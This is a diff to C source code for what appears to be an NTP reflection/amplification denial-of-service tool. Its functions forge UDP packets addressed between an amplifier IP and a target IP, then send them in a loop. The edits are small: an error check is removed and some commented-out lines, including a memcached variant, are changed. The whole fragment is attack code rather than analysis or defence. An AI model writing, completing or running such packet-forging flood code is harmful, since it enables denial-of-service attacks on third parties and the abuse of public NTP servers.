@@ -1,4 +1,3 @@
-
 #include "venus.h"
 #include "strix.h"
 #include "NTPforge.h"
@@ -19,6 +18,7 @@ void ntpSetValue( AttackPlan * p_atkData )
     int sock = CreateSocket(UDP, BLOCK);
     NtpBinaryResponseHeader response;
     ConnectTCP(sock, p_atkData->setPacket);
+
     for(Packet *tmpPkt = p_atkData->setPacket; tmpPkt != NULL; tmpPkt = tmpPkt->next)
     {
         if( SendPacket(sock, tmpPkt) < 0 )
@@ -27,11 +27,6 @@ void ntpSetValue( AttackPlan * p_atkData )
         }
 
         recv(sock, &response, sizeof(NtpBinaryResponseHeader), 0);
-        
-        // if(response.status != 0)
-        // {
-        //     Efatal(ERROR_NTP, "Error ntp: cannot set data\n");
-        // }
     }
     CloseSocket(sock);
 }
@@ -45,6 +40,7 @@ static AttackPlan * createAttackDataNTP( LhfDraft *p_draft )
     arg = NTP;
     //newData->setPacket = ForgeTCP( p_draft->amp_ip, GetPort(p_draft->amp_port), ForgeNtpBinary, &arg );
     newData->setPacket = ForgeUDP( p_draft->amp_ip, p_draft->target_ip, GetPort(p_draft->amp_port), ForgeNtpBinary, &arg );
+    // newData->setPacket = NULL;
     // newData->getPacket = ForgeUDP( p_draft->amp_ip, p_draft->target_ip, GetPort(p_draft->amp_port), ForgeNtpText, &arg );
     newData->getPacket = ForgeUDP( p_draft->amp_ip, p_draft->target_ip, GetPort(p_draft->amp_port), ForgeNtpBinary, &arg );
     newData->draft = p_draft;
@@ -71,11 +67,6 @@ int  ExecuteNtpMirror( void *p_draft )
         default:
             plan = createAttackDataNTP( draft );
             break;
-
-        // case MEMCACHED_STATS:
-        // default:
-        //     plan = createAttackDataSTATS( draft );
-        //     break;
     }
     executeAttackNtp(plan);
     return 0;
